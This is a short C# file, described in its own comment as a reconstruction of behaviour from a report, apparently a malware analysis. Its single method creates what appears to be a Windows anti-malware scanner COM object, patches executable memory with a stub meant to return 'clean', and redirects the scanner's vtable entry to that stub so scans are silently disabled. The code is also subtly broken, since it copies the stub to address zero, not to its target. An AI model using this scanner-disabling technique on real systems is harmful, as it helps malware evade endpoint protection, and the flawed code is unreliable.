using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Windows.Markup;

// Behavioral reconstruction of the report, not the original recovered assembly.
public static class ManagedTechniques {
    [DllImport("kernel32.dll")]
    static extern bool VirtualProtect(IntPtr address, UIntPtr size, uint protection, out uint old);

    public static void PatchScanner() {
        if (IntPtr.Size != 8) return;
        object scanner = Activator.CreateInstance(Type.GetTypeFromCLSID(new Guid("fdb00e52-a214-4aa1-8fba-4357bb0072ec")));
        Action replacement = Console.Clear;
        IntPtr target = replacement.Method.MethodHandle.GetFunctionPointer();
        byte[] clean = { 0x41, 0xc7, 0x00, 0x01, 0x00, 0x00, 0x00, 0x33, 0xc0, 0xc3 };
        uint previous;
        VirtualProtect(target, (UIntPtr)clean.Length, 0x40, out previous);
        Marshal.Copy(clean, 0, IntPtr.Zero, clean.Length);
        uint ignored;
        VirtualProtect(target, (UIntPtr)clean.Length, previous, out ignored);
        IntPtr instance = Marshal.GetIUnknownForObject(scanner);
        IntPtr table = Marshal.ReadIntPtr(instance);
        IntPtr slot = IntPtr.Add(table, 0x18);
        VirtualProtect(slot, (UIntPtr)IntPtr.Size, 0x04, out previous);
        Marshal.WriteIntPtr(slot, target);
        VirtualProtect(slot, (UIntPtr)IntPtr.Size, previous, out ignored);
        Marshal.Release(instance);
    }

}
